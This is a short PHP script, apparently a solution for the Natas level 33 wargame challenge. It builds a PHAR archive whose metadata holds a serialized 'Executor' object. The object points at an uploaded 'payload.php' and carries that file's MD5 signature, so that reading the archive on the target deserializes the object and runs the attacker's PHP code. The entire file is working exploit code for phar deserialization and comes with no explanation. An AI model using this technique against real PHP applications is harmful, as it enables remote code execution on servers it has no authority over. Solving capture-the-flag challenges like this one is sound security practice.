<?php

    class Executor {
        private $filename;
        private $signature;
        private $init;

        function __construct() {
            global $payload;

            $this->filename = "/natas33/upload/payload.php";
            $this->signature = md5(file_get_contents('payload.php'));
            $this->init = true;
        }
    }

    @unlink("exploit.phar");

    $phar = new Phar("exploit.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->addFromString("a", "a");

    $object = new Executor();
    $phar->setMetadata($object);

    $phar->stopBuffering();

?>